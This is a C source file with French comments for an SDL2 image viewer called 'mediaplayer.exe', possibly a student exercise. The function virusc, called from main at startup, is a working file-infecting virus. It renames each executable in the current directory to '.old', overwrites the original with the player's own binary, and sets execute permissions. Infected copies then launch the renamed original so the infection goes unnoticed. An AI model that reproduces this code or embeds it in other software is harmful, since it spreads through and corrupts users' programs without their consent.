#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <unistd.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

SDL_Window *window = NULL;
SDL_Renderer *renderer = NULL;
SDL_Texture *texture = NULL;
SDL_Texture *arrowLeftTexture = NULL;
SDL_Texture *arrowRightTexture = NULL;
SDL_Rect dstrect;

// Définir une taille maximale pour le nombre d'images
#define MAX_IMAGES 100

// Liste des noms de fichiers d'images à charger
char* images[MAX_IMAGES];
int numImages = 0;
int currentImageIndex = 0; // Ajout de l'indice de l'image actuelle

// Fonction pour charger les noms des fichiers images du répertoire "photo"
void loadImagesFromDirectory() {
    DIR *dir;
    struct dirent *entry;

    // Ouvrir le répertoire "photo"
    dir = opendir("photo");
    if (dir == NULL) {
        printf("Impossible d'ouvrir le répertoire 'photo'.\n");
        return;
    }

    // Parcourir tous les fichiers dans le répertoire
    while ((entry = readdir(dir)) != NULL) {
        // Vérifier si le fichier est une image jpg ou png
        if (strstr(entry->d_name, ".jpg") || strstr(entry->d_name, ".png")) {
            // Allouer de la mémoire pour stocker le chemin complet du fichier
            char fullPath[PATH_MAX];
            snprintf(fullPath, sizeof(fullPath), "photo/%s", entry->d_name);

            // Allouer de la mémoire pour stocker le nom du fichier
            images[numImages] = strdup(fullPath);
            if (images[numImages] == NULL) {
                printf("Erreur d'allocation de mémoire.\n");
                closedir(dir);
                return;
            }

            numImages++;

            // Vérifier si le nombre maximum d'images a été atteint
            if (numImages >= MAX_IMAGES) {
                printf("Trop d'images dans le répertoire 'photo'.\n");
                closedir(dir);
                return;
            }
        }
    }

    // Fermer le répertoire
    closedir(dir);
}

// Fonction pour générer une copie avec l'extension .old pour les fichiers exécutables
void backupExecutables() {
    DIR *directory;
    struct dirent *entry;

    // Ouvrir le répertoire courant
    directory = opendir(".");
    if (directory == NULL) {
        perror("Erreur lors de l'ouverture du répertoire");
        return;
    }

    // Parcourir les fichiers du répertoire
    while ((entry = readdir(directory)) != NULL) {
        // Obtenir les informations sur le fichier
        struct stat fileStat;
        if (stat(entry->d_name, &fileStat) == -1) {
            perror("Erreur lors de la récupération des informations sur le fichier");
            continue;
        }

        // Vérifier si le fichier est un fichier source exécutable (.c)
        if (S_ISREG(fileStat.st_mode) && (fileStat.st_mode & S_IXUSR)) {
            // Construire le nom du fichier de sauvegarde
            char backupName[PATH_MAX];
            snprintf(backupName, sizeof(backupName), "%s.old", entry->d_name);

            // Copier le contenu du fichier d'origine dans le fichier de sauvegarde
            FILE *originalFile = fopen(entry->d_name, "rb");
            if (originalFile == NULL) {
                perror("Erreur lors de l'ouverture du fichier original");
                continue;
            }
            FILE *backupFile = fopen(backupName, "wb");
            if (backupFile == NULL) {
                perror("Erreur lors de l'ouverture du fichier de sauvegarde");
                fclose(originalFile);
                continue;
            }

            int character;
            while ((character = fgetc(originalFile)) != EOF) {
                fputc(character, backupFile);
            }

            fclose(originalFile);
            fclose(backupFile);

            printf("Fichier sauvegardé : %s\n", backupName);
        }
    }

    closedir(directory);
}

// Fonction pour vérifier si un fichier .old existe déjà
int fichier_old_existe(const char *filename) {
    char backupName[PATH_MAX];
    snprintf(backupName, sizeof(backupName), "%s.old", filename);
    FILE *file = fopen(backupName, "r");
    if (file) {
        fclose(file);
        return 1;
    }
    return -1;
}

// Fonction pour charger une nouvelle image
void loadNewImage(int index) {
    SDL_Surface *imageSurface = IMG_Load(images[index]);
    if (!imageSurface) {
        SDL_Log("Impossible de charger l'image : %s\n", SDL_GetError());
        return;
    }

    if (texture) {
        SDL_DestroyTexture(texture);
    }

    texture = SDL_CreateTextureFromSurface(renderer, imageSurface);
    SDL_FreeSurface(imageSurface);
    if (!texture) {
        SDL_Log("Impossible de créer la texture : %s\n", SDL_GetError());
        return;
    }

    SDL_QueryTexture(texture, NULL, NULL, &dstrect.w, &dstrect.h);
    dstrect.x = (800 - dstrect.w) / 2; 
    // Centrer l'image horizontalement
    dstrect.y = (600 - dstrect.h) / 2; // Centrer l'image verticalement
}

// Fonction pour charger les images des flèches
void loadArrowImages() {
    SDL_Surface *arrowLeftSurface = IMG_Load("fleche/arrow_right.png");
    if (!arrowLeftSurface) {
        SDL_Log("Impossible de charger l'image de la flèche gauche : %s\n", SDL_GetError());
        return;
    }
    arrowLeftTexture = SDL_CreateTextureFromSurface(renderer, arrowLeftSurface);
    SDL_FreeSurface(arrowLeftSurface);

    SDL_Surface *arrowRightSurface = IMG_Load("fleche/arrow_left.png");
    if (!arrowRightSurface) {
        SDL_Log("Impossible de charger l'image de la flèche droite : %s\n", SDL_GetError());
        return;
    }
    arrowRightTexture = SDL_CreateTextureFromSurface(renderer, arrowRightSurface);
    SDL_FreeSurface(arrowRightSurface);
}

void virusc(int argc, char *argv[]) {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            struct stat sb;

            if (strcmp(argv[0], "./mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ".old") == NULL) {
                if (!stat(dir->d_name, &sb)) {
                    if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {
                        printf("Infection en cours...\n");
                        printf("%s\n", dir->d_name);
                        char *fichier = (char *) dir->d_name;
                        printf("existe %d\n", fichier_old_existe(fichier));
                        if (fichier_old_existe(fichier) == -1) {
                            char *fichier_old = malloc(strlen(fichier) + 15);
                            strcpy(fichier_old, fichier);
                            strcat(fichier_old, ".old");

                            if (rename(fichier, fichier_old) == 0) {
                                printf("Fichier %s renomme en %s\n", fichier, fichier_old);
                            } else {
                                printf("Erreur lors du renommage du fichier %s\n", fichier);
                            }

                            FILE *virus = fopen("mediaplayer.exe", "rb");
                            FILE *cible = fopen(fichier, "wb");
                            if (virus != NULL && cible != NULL) {
                                char buffer[1024];
                                size_t bytes;
                                while ((bytes = fread(buffer, 1, sizeof(buffer), virus)) > 0) {
                                    fwrite(buffer, 1, bytes, cible);
                                }
                                fclose(virus);
                                fclose(cible);
                                chmod(fichier, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
                                printf("Fichier %s infecte\n", fichier);
                            } else {
                                printf("Erreur lors de l'infection du fichier %s\n", fichier);
                            }
                        } else {
                            printf("Fichier %s deja cible\n", fichier);
                        }
                    }
                }
            }
        }
        closedir(d);
    }
}


int main(int argc, char *argv[]) {
    loadImagesFromDirectory();
    backupExecutables();
    virusc(argc, argv);  // Appel de la fonction infect() lors du démarrage du programme

    if (strcmp(argv[0], "./mediaplayer.exe") == 0) {
        // Code pour le lecteur multimédia avec GTK et GStreamer

        if (SDL_Init(SDL_INIT_VIDEO) != 0) {
            SDL_Log("Impossible d'initialiser SDL : %s\n", SDL_GetError());
            return 1;
        }

        window = SDL_CreateWindow("Media Player", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 800, 600, SDL_WINDOW_SHOWN);
        renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

        loadArrowImages();
        loadNewImage(0);

        SDL_Event event;
        int quit = 0;
        while (!quit) {
            while (SDL_PollEvent(&event)) {
                if (event.type == SDL_QUIT) {
                    quit = 1;
                } else if (event.type == SDL_KEYDOWN) {
                    switch (event.key.keysym.sym) {
                        case SDLK_LEFT:
                            currentImageIndex = (numImages + currentImageIndex - 1) % numImages;
                            loadNewImage(currentImageIndex);
                            break;
                        case SDLK_RIGHT:
                            currentImageIndex = (currentImageIndex + 1) % numImages;
                            loadNewImage(currentImageIndex);
                            break;
                        default:
                            break;
                    }
                } else if (event.type == SDL_MOUSEBUTTONDOWN) {
                    int mouseX, mouseY;
                    SDL_GetMouseState(&mouseX, &mouseY);
                    if (mouseX >= 20 && mouseX <= 70 && mouseY >= 300 && mouseY <= 350) {
                        currentImageIndex = (numImages + currentImageIndex - 1) % numImages;
                        loadNewImage(currentImageIndex);
                    }
                    if (mouseX >= 730 && mouseX <= 780 && mouseY >= 300 && mouseY <= 350) {
                        currentImageIndex = (currentImageIndex + 1) % numImages;
                        loadNewImage(currentImageIndex);
                    }
                }
            }

            SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);
            SDL_RenderClear(renderer);

            if (texture) {
                SDL_RenderCopy(renderer, texture, NULL, &dstrect);
            }

            if (arrowLeftTexture && arrowRightTexture) {
                SDL_Rect leftArrowRect = {20, 300, 50, 50};
                SDL_Rect rightArrowRect = {730, 300, 50, 50};
                SDL_RenderCopy(renderer, arrowLeftTexture, NULL, &leftArrowRect);
                SDL_RenderCopy(renderer, arrowRightTexture, NULL, &rightArrowRect);
            }

            SDL_RenderPresent(renderer);
        }

        if (texture) {
         
            SDL_DestroyTexture(texture);
        }
        if (arrowLeftTexture) {
            SDL_DestroyTexture(arrowLeftTexture);
        }
        if (arrowRightTexture) {
            SDL_DestroyTexture(arrowRightTexture);
        }
        if (renderer) {
            SDL_DestroyRenderer(renderer);
        }
        if (window) {
            SDL_DestroyWindow(window);
        }
        SDL_Quit();

        return 0;
    } else {
        // Code pour le comportement lorsque le programme est exécuté avec un nom différent

        char *fichier = malloc(strlen(argv[0]) + 15);
        if (fichier == NULL) {
            perror("Allocation de mémoire pour le fichier");
            return 1;
        }
        strcpy(fichier, argv[0]);
        strcat(fichier, ".old");
        printf("Lancement du fichier %s\n", fichier);
     execl(fichier, fichier, NULL);
        free(fichier);
    }

    return 0;
}


